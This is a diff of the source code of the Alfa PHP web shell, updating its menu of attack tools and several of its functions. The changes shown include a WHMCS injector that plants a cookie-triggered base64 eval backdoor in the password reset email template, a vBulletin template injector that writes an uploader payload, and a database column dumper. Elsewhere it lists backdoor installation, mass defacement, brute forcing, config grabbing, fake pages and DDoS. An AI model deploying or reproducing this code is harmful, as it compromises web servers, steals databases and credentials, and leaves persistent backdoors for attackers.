-$li = array('FilesMan'=>'Home','proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Mysql Dumper','hash'=>'En-Decoder','connect'=>'BC','ssh2'=>'SSH2',
+$li = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
 'zoneh'=>'ZONE-H','dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL','cpcrack'=>'Hash Tools',
-'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
-'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher',
-'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','settings'=>'Alfa Settings','plus'=>'<span class="alfa_plus">Alfa +</font>','selfrm'=>'Remove Shell'
+'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','deziper'=>'DeCompressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
+'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher','config_grabber'=>'Config Grabber','fakepage'=>'Fake Page','archive_manager'=>'Archive Manager',
+'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
 );
 foreach($li as $key=>$value){
-echo('<li><a href="javascript:void(0);" class="menu_options" onclick="g(\''.$key.'\',null,\'\',\'\',\'\');">'.$value.'</a></li>'."\n");
+echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
 }
-if(!empty($_SESSION['AlfaUser']) && !empty($_SESSION['AlfaPass']))
-echo '<li><a href="javascript:void(0);" onclick="g(\'logout\',null,\'\',\'\',\'\');setTimeout(function(){location.reload();},2000);"><font color="red">LogOut</font></a></li></ul></div>';
-else
-echo '</ul></div>';}else{
+echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
 @error_reporting(E_ALL ^ E_NOTICE);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
@@ -1853,8 +1225,10 @@ echo '</ul></div>';}else{
 @set_time_limit(0);
 }}
 function alfalogout(){
-unset($_SESSION['AlfaUser'],$_SESSION['AlfaPass']);
-echo("<center><font color='red'>Logout...</font></center>");
+@setcookie("AlfaUser", null, 2012);
+@setcookie("AlfaPass", null, 2012);
+unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
+echo("ok");
 }
 function showAnimation($name){
 	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
@@ -1862,7 +1236,7 @@ function showAnimation($name){
 function __showicon($r){
 	$s['btn']='http://solevisible.com/images/btn.png';
 	$s['alfamini']='http://solevisible.com/images/alfamini.png';
-	$s['loader']='http://solevisible.com/images/loader.png';
+	$s['loader']='http://solevisible.com/images/loader.svg';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
 }
@@ -1997,16 +1371,33 @@ $content = "";
 while(!feof($fh)){
 $content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
 }
+@fclose($fh);
 }
 if(empty($content)||!$content){
 	$content = alfaEx("cat '".addslashes($file)."'");
 }
 return $content;
 }
+function alfaMarket(){
+echo "<div class='header'>";
+$curl = new AlfaCURL();
+$content = $curl->Send("http://solevisible.com/market.php");
+$data = @json_decode($content, true);
+if(!empty($data)){
+if($data["status"] == "open"){
+	echo $data["content"];
+}else{
+	echo $data["error_msg"];
+}
+}else{
+	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
+}
+echo "</div>";
+}
 function alfaSettings(){
 alfahead();
 AlfaNum(6,7,8,9,10);
-echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'color\')">| Change Color | </a></h3></center>';
+echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
 if($_POST["alfa8"] == "main"){
 echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
 $lg_array = array('0'=>'No','1'=>'Yes');
@@ -2015,13 +1406,15 @@ $protect_html = "";
 $icon_html = "";
 $postEnc_html = "";
 $login_html = "";
+$cgiapi_html = "";
 foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
 foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
+foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$val.'</option>';
 foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
 $lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
 foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';
 echo '';
-echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
+echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
 if($_POST['alfa5']=='>>'){
 echo __pre();
 if(!empty($_POST['alfa3'])){
@@ -2031,37 +1424,50 @@ $username = $_POST['alfa3'];
 $password = md5($_POST['alfa4']);
 $icon = $_POST['alfa6'];
 $post_encrypt = $_POST['alfa7'];
+$cgi_api_val = $_POST['alfa9'];
 @chdir($GLOBALS['home_cwd']);
 $basename = @basename($_SERVER['PHP_SELF']);
 $data = @file_get_contents($basename);
-$find_user = '/\'user\'(.*?),/i';
-$find_pw = '/\'pass\'(.*?),/i';
-$find_lg = '/\'login_page\'(.*?),/i';
-$find_p = '/\'safemode\'(.*?),/i';
-$icons = '/\'show_icons\'(.*?),/i';
-$postEnc = '/\'post_encryption\'(.*?),/i';
+$user_rand = $GLOBALS["DB_NAME"]["user_rand"];
+$pass_rand = $GLOBALS["DB_NAME"]["pass_rand"];
+$login_page_rand = $GLOBALS["DB_NAME"]["login_page_rand"];
+$safemode_rand = $GLOBALS["DB_NAME"]["safemode_rand"];
+$show_icons_rand = $GLOBALS["DB_NAME"]["show_icons_rand"];
+$post_encryption_rand = $GLOBALS["DB_NAME"]["post_encryption_rand"];
+$cgi_api_rand = $GLOBALS["DB_NAME"]["cgi_api_rand"];
+$find_user = '/\''.$user_rand.'\'(.*?),/i';
+$find_pw = '/\''.$pass_rand.'\'(.*?),/i';
+$find_lg = '/\''.$login_page_rand.'\'(.*?),/i';
+$find_p = '/\''.$safemode_rand.'\'(.*?),/i';
+$icons = '/\''.$show_icons_rand.'\'(.*?),/i';
+$postEnc = '/\''.$post_encryption_rand.'\'(.*?),/i';
+$cgi_api_reg = '/\''.$cgi_api_rand.'\'(.*?),/i';
 if(!empty($username)&&preg_match($find_user,$data,$e)){
-$new = '\'user\' => \''.$username.'\',';
+$new = '\''.$user_rand.'\' => \''.$username.'\',';
 $data = str_replace($e[0],$new,$data);
 }
 if(!empty($_POST['alfa4'])&&preg_match($find_pw,$data,$e)){
-$new = '\'pass\' => \''.$password.'\',';
+$new = '\''.$pass_rand.'\' => \''.$password.'\',';
 $data = str_replace($e[0],$new,$data);
 }
 if(!empty($lgpage)&&preg_match($find_lg,$data,$e)){
-$new = '\'login_page\' => \''.$lgpage.'\',';
+$new = '\''.$login_page_rand.'\' => \''.$lgpage.'\',';
 $data = str_replace($e[0],$new,$data);
 }
 if(!empty($find_p)&&preg_match($find_p,$data,$e)){
-$new = '\'safemode\' => \''.$protect.'\',';
+$new = '\''.$safemode_rand.'\' => \''.$protect.'\',';
 $data = str_replace($e[0],$new,$data);
 }
 if(preg_match($icons,$data,$e)){
-$new = '\'show_icons\' => \''.$icon.'\',';
+$new = '\''.$show_icons_rand.'\' => \''.$icon.'\',';
 $data = str_replace($e[0],$new,$data);
 }
 if(preg_match($postEnc,$data,$e)){
-$new = '\'post_encryption\' => '.$post_encrypt.',';
+$new = '\''.$post_encryption_rand.'\' => '.$post_encrypt.',';
+$data = str_replace($e[0],$new,$data);
+}
+if(preg_match($cgi_api_reg,$data,$e)){
+$new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
 $data = str_replace($e[0],$new,$data);
 }
 if(@file_put_contents($basename,$data)){
@@ -2147,42 +1553,13 @@ if($_POST['alfa2']=='>>'){
 echo('</div>');
 alfafooter();
 }
-function alfaplus(){
+function alfaaboutus(){
 alfahead();
-echo '<div class="header"><center><p><div class="txtfont_header">| Alfa + |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'plus\',null,\'news\');">| News | </a><a href=javascript:void(0) onclick="g(\'plus\',null,\'tools\')">| Tools | </a><a href=javascript:void(0) onclick="g(\'plus\',null,\'about\')">| About Us | </a></h3></center>';
-if($_POST['alfa1']=='news'||$_POST['alfa1']=='tools'){
-try{
-$s1 = 'http://solevisible.com/'.($_POST['alfa1']=='news'?'news.php':'tools.php');
-$msg = "<center><font color='red'><b><p>Can`t Connect to Remote Server ...!<br>Please Try Again Later...!</p></b></font></center>";
+echo '<div class="header">';
 $news = new AlfaCURL();
-if($news->Send($s1)){
-$xml = $news->Send($s1);
-}else{
-$xml = false;
-}
-if($xml){
-if(@simplexml_load_string($xml)){
-$doc = new DOMDocument;
-$doc->loadXML($xml);
-$data = $doc->getElementsByTagName('data')->item(0);
-$items = $data->getElementsByTagName('item');
-foreach($items as $item){
-$title = $item->getElementsByTagName('title')->item(0)->nodeValue;
-$description = $item->getElementsByTagName('description')->item(0)->nodeValue;
-$link = $item->getElementsByTagName('link')->item(0)->nodeValue;
-$pubDate = $item->getElementsByTagName('pubDate')->item(0)->nodeValue;
-echo(__pre()."<center><a href='$link' target='_blank'>$title</a><br>$description<br><small><font  color='#FFFFFF'><b>Date: $pubDate</b></font></small></center></pre>");
-}
-}else{
-echo($msg);
-}
-}else{
-echo($msg);
-}
-}catch(Exception $e){
-echo $e->getMessage();
-}}elseif($_POST['alfa1']=='about'){
-echo __pre()."<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
+$about_us = $news->Send("http://solevisible.com/aboutus.php");
+if(empty($about_us)){
+$about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
@@ -2190,9 +1567,120 @@ echo __pre()."<pre><center><img src='http://solevisible.com/images/farvahar-iran
 <font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
 <font color='#FFFFFF'>Skype : sole.sad</font><br>
 <font color='#FF0000'>Persian Gulf For Ever</font><br>
-<font color='#FF0000'>Iranian Hackers :)</font><br>
-<font color='#FF0000'>Our Friends : Mr.PERSIA , R3veC0der</font><br>
+<font color='#FF0000'>Iranian Programmers</font><br>
+<font color='#FF0000'>############</font><br>
 </center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
+}
+echo __pre().$about_us;
+echo('</div>');
+alfafooter();
+}
+function alfacoldumper(){
+alfahead();
+echo('<div class="header">');
+AlfaNum(8,9,10);
+echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
+$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
+$selected_data = json_decode($_POST['alfa2'], true);
+$username = ($_POST['alfa3']);
+$password = ($_POST['alfa4']);
+$dbname = ($_POST['alfa5']);
+$dfile = ($_POST['alfa6']);
+$host = ($_POST['alfa7']);
+$table = array('td1' =>
+ array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
+ 'td2' =>
+ array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'),
+ 'td3' =>
+ array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'),
+ 'td4' =>
+ array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'),
+ 'td5' =>
+ array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
+);
+create_table($table);
+echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
+$db = false;
+if(!empty($dbname)){
+	$db = @mysqli_connect($host, $username, $password, $dbname);
+}
+if(count($selected_data) > 0){
+	if($db){
+		if(!is_dir($dfile)){
+			$dfile = $GLOBALS['cwd'];
+		}
+		$tbls = "";
+		$ext = '.txt';
+		if($delimiter == 'json'){
+			$ext = '.json';
+		}
+		foreach ($selected_data as $tbl => $cols) {
+			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
+			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
+			$fp = fopen($file_name, "w");
+			$data = array();
+			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
+				if($delimiter == "json"){
+					$col_arr = array();
+					foreach ($row as $key => $value) {
+						if(empty($value)){
+							$value = "[empty]";
+						}
+						 $col_arr[$key] = $value;
+					}
+					$data[$tbl][] = $col_arr;
+				}else{
+					$data = "";
+					foreach ($row as $key => $value) {
+						if(empty($value)){
+							$value = "[empty]";
+						}
+						$data .= $value . $delimiter;
+					}
+					fwrite($fp, $data ."\n");
+				}
+			}
+			if($delimiter == "json"){
+				fwrite($fp, json_encode($data));
+			}
+			fclose($fp);
+			$tbls .= "Done ~~~> ".$file_name."<br>";
+		}
+		echo __pre();
+		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
+	}
+}
+if(!empty($dbname) && count($selected_data) == 0){
+//echo __pre();
+if($db){
+	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
+	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
+	$data = array();
+	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
+	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
+		$data[$row["table_name"]] = array();
+		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
+		$table_count = mysqli_fetch_row($table_count_q);
+		$data[$row["table_name"]]["data_count"] = $table_count[0];
+		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
+		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
+		}
+	}
+	mysqli_close($db);
+
+	echo '<ul id="myUL">';
+	foreach($data as $tbl => $cols){
+	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
+	    foreach($cols["cols"] as $col){
+	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
+	    }
+	    echo '</ul></li>';
+	}
+	echo '</ul>';
+}else{
+echo('<center>mysqli_connect : Error!</center>');
+}
 }
 echo('</div>');
 alfafooter();
@@ -2251,7 +1739,7 @@ curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($curl, CURLOPT_URL,$url);
 curl_setopt($curl, CURLOPT_USERPWD, $info['username'].':'.$info['password']);
 if($info['mysql'])curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
-$result = curl_exec($curl);
+$result = @curl_exec($curl);
 $curl_errno = curl_errno($curl);
 $curl_error = curl_error($curl);
 if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
@@ -2273,7 +1761,7 @@ curl_setopt($curl, CURLOPT_HEADER,0);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
 curl_setopt($curl, CURLOPT_HTTPHEADER, array("Authorization: Basic " . __ZW5jb2Rlcg($info['username'].":".$info['password']) . "\n\r"));
 curl_setopt($curl, CURLOPT_URL, $url);
-$result = curl_exec($curl);
+$result = @curl_exec($curl);
 $curl_errno = curl_errno($curl);
 $curl_error = curl_error($curl);
 if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
@@ -2291,7 +1779,7 @@ curl_setopt($curl, CURLOPT_URL, $url);
 curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($curl, CURLOPT_USERPWD, "".$info['username'].":".$info['password']."");
-$result = curl_exec($curl);
+$result = @curl_exec($curl);
 $curl_errno = curl_errno($curl);
 $curl_error = curl_error($curl);
 if ($curl_errno > 0) {echo "<font color='red'>Error: $curl_error</font><br>";}
@@ -2362,48 +1850,6 @@ echo '<br><font color="red">Attack Finished...</font>';
 echo '</div>';
 alfafooter();
 }
-function alfassh2(){
-if(function_exists('ssh2_connect')){
-$_SESSION['connected']= false;
-$ssh_ip = $_POST['alfa1'];
-$ssh_login = $_POST['alfa2'];
-$ssh_pass = $_POST['alfa3'];
-$ssh_port = $_POST['alfa4'];
-$ssh_command = $_POST['alfa5'];
-if($alfaconnect2ssh=@ssh2_connect($ssh_ip, $ssh_port))
-{
-if($alfalogin=@ssh2_auth_password($alfaconnect2ssh, $ssh_login, $ssh_pass))
-{
-$_SESSION['connected']= true;
-}
-}
-if($_SESSION['connected']!== true){
-alfahead();
-echo "<div class=header>";
-echo "<form name='ssh2' method='post' onsubmit='g(\"ssh2\",null,this.ssh_ip.value,this.ssh_login.value,this.ssh_pass.value,this.ssh_port.value); return false;'><table cellpadding='2' cellspacing='0'><tr><td><font color=\"#ffffff\"><b>IP</b></font></td><td><font color=\"#ffffff\"><b>SSH USER</b></font></td><td><font color=\"#ffffff\"><b>SSH PASS</b></font></td><td><font color=\"#ffffff\"><b>SSH PORT</b></font></td><td></td></tr><tr><td><input type=text name=ssh_ip value=''></td><td><input type=text name=ssh_login value=''></td><td><input type=text name=ssh_pass value=''></td><td><input type=text name=ssh_port value=''></td><td><input type='submit' name='submit' value=' '></td></table></form></div>";
-alfafooter();
-}
-if($_SESSION['connected']==true){
-alfahead();
-echo "<div class=header>";
-echo "<form name='ssh2' method='post' onsubmit='g(\"ssh2\",null,\"".$ssh_ip."\",\"".$ssh_login."\",\"".$ssh_pass."\",\"".$ssh_port."\",this.ssh_command.value,\">>\"); return false;'><table cellpadding='2' cellspacing='0'><tr><td><input type=text name=ssh_command value=''></td><td><input type='submit' name='execute' value=' '></td></table></form><form name='ssh2' method='post' onsubmit='g(\'ssh2\',null,\'\',\'\',\'\'); return false;'><input type=submit name='destsession' value='logout'></form>";
-$alfastream = ssh2_exec($alfaconnect2ssh, $ssh_command);
-stream_set_blocking($alfastream,true);
-$output = ssh2_fetch_stream($alfastream,SSH2_STREAM_STDIO);
-if($_POST['alfa6']=='>>'){
-echo '<pre class=ml1>';
-ob_start();
-echo  stream_get_contents($output);
-echo htmlspecialchars(ob_get_clean());
-}
-echo "</div>";
-alfafooter();
-}}else{
-alfahead();
-echo '<div class=header><p><center><b><font color="red">Server does not support SSH2</font><p></b></center></div>';
-alfafooter();
-}
-}
 function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
 function alfaShellInjectors(){
 alfahead();
@@ -2440,11 +1886,12 @@ $newin = str_replace("'","\'",$index);
 $newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
 if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
 if(filter_var($path,FILTER_VALIDATE_URL)){
-$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
+$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_connect_error());
 $soleSave= mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
 $soleGet = mysqli_fetch_assoc($soleSave);
 $tempSave1 = $soleGet['message'];
 $tempSave = str_replace("'","\'",$tempSave1);
+mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
 $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
 $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
 $create = "insert into tblclients (email) values('solevisible@fbi.gov')";
@@ -2545,38 +1992,54 @@ echo $selector;
 echo '<p><input type="submit" value=" " /></p></form></center>';
 if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
 $method = $_POST['alfa8'];
+$faq_name = "faq";
+$faq_file = "/faq.php";
 $code = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
-$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_error($conn));
-$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='faq'";
+$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
+$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
 $recivedata = @mysqli_query($conn,$rec);
 $getd = @mysqli_fetch_assoc($recivedata);
 $savetoass = $getd['template'];
+if(empty($savetoass)){
+	$faq_name = "header";
+	$faq_file = "/";
+	$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
+	$recivedata = @mysqli_query($conn,$rec);
+	$getd = @mysqli_fetch_assoc($recivedata);
+	$savetoass = $getd['template'];
+	$code = ALFA_UPLOADER.";";
+}
 $code = str_replace("'","\'",$code);
-$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='faq'";
+$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
 $ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
 $geturl = @mysqli_query($conn,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
 $getval = @mysqli_fetch_assoc($geturl);
 $saveval = $getval['value'];
+if($faq_name == "header"){
+	if(substr($saveval, -5, 5) == "/core"){
+		$saveval = substr($saveval, 0, -5);
+	}
+}
 $realurl = parse_url($saveval,PHP_URL_HOST);
